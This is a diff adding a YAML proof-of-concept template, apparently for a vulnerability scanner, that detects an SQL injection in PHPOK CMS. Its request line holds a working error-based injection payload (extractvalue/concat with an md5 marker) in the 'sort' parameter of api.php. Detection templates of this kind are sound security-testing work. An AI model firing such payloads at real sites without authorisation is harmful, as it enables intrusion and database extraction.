@@ -1,0 +1,18 @@
+name: yaml-poc-phpok-phpok_cms-sql_injection-CT-158158
+binding: 37828115-ace8-46df-9a7c-6c78c7f4e388
+detail:
+    author: system_user
+    vulnerability:
+        id: afc46e40-4845-429b-9c8a-8157a3a62a93
+        level: high
+transport: http
+set:
+    r1: randomInt(800000000, 1000000000)
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /api.php?c=project&f=index&token=1234&id=news&sort=1 and extractvalue(1,concat(0x7e,md5({{r1}}))) --+
+        expression: response.body.bcontains(bytes(substr(md5(string(r1)), 0, 31)))
+expression: r0()
